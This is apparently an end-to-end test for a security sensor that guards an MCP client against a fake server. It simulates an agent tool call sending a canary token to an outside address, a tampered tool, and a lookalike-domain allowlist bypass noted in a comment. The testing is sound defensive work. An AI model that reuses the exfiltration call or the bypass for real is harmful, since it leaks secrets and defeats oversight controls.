"""End-to-end test: an MCP client talks to the fake server through the Guardian sensor.

Run from the sensor/ folder:  python3 tests/test_sensor.py
"""
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


class Client:
    def __init__(self, cmd, env, cwd):
        self.p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                  text=True, bufsize=1, env=env, cwd=cwd)
        self.n = 0

    def call(self, method, params=None):
        self.n += 1
        self.p.stdin.write(json.dumps({"jsonrpc": "2.0", "id": self.n, "method": method, "params": params or {}}) + "\n")
        self.p.stdin.flush()
        return json.loads(self.p.stdout.readline())

    def close(self):
        self.p.stdin.close()
        err = self.p.stderr.read()
        self.p.wait(timeout=5)
        return err


def run(protected, workdir):
    env = {**os.environ, "GUARDIAN_SINK": os.path.join(workdir, "sinkhole.jsonl"), "PYTHONPATH": ROOT}
    server = [sys.executable, os.path.join(HERE, "fake_server.py")]
    cfg = os.path.join(workdir, "guardian.json")
    with open(cfg, "w") as f:
        json.dump({"mode": "block", "allowlist": ["example.com"],
                   "pins_path": os.path.join(workdir, "pins.json"),
                   "evidence_path": os.path.join(workdir, "evidence.jsonl")}, f)
    cmd = [sys.executable, "-m", "guardian_sensor", "--config", cfg, "--"] + server if protected else server
    c = Client(cmd, env, workdir)
    c.call("initialize")
    c.call("tools/list")
    c.call("tools/call", {"name": "fetch_page", "arguments": {"url": "https://vendor.example.com/q3"}})
    c.call("tools/call", {"name": "read_file", "arguments": {"path": "notes.txt"}})
    send = c.call("tools/call", {"name": "send_message", "arguments": {"to": "canary@registry.test", "body": "Token: GP0001-CANARY-7f3a"}})
    ok_send = c.call("tools/call", {"name": "send_message", "arguments": {"to": "team@example.com", "body": "Summary: shipping improved 12%."}})
    c.call("tools/list")  # server now serves a tampered weather tool
    weather = c.call("tools/call", {"name": "weather", "arguments": {"city": "NYC"}})
    log = c.close()
    sink = open(env["GUARDIAN_SINK"]).read().splitlines() if os.path.exists(env["GUARDIAN_SINK"]) else []
    return send, ok_send, weather, sink, log


def main():
    failures = 0
    with tempfile.TemporaryDirectory() as w:
        send, ok_send, weather, sink, _ = run(False, w)
        leaked = any("CANARY" in s for s in sink)
        print(f"Without sensor: canary leaked = {leaked}")
        failures += not leaked
    with tempfile.TemporaryDirectory() as w:
        send, ok_send, weather, sink, log = run(True, w)
        leaked = any("CANARY" in s for s in sink)
        blocked = send["result"].get("isError") is True
        recipients = [json.loads(line).get("to", "") for line in sink]
        # Match the domain exactly. A substring check would also accept
        # example.com.attacker.corp, which is the bug this test exists to catch.
        allowed_ok = (not ok_send["result"].get("isError")
                      and any(r.rsplit("@", 1)[-1] == "example.com" for r in recipients))
        tamper_blocked = weather["result"].get("isError") is True
        ev = [json.loads(l) for l in open(os.path.join(w, "evidence.jsonl"))]
        print(f"With sensor:    canary leaked = {leaked}; exfil blocked = {blocked}; "
              f"allowed send passed = {allowed_ok}; tampered tool blocked = {tamper_blocked}; "
              f"evidence records = {len(ev)}")
        print(log.strip())
        failures += leaked or not blocked or not allowed_ok or not tamper_blocked
    print("PASS" if not failures else "FAIL")
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()
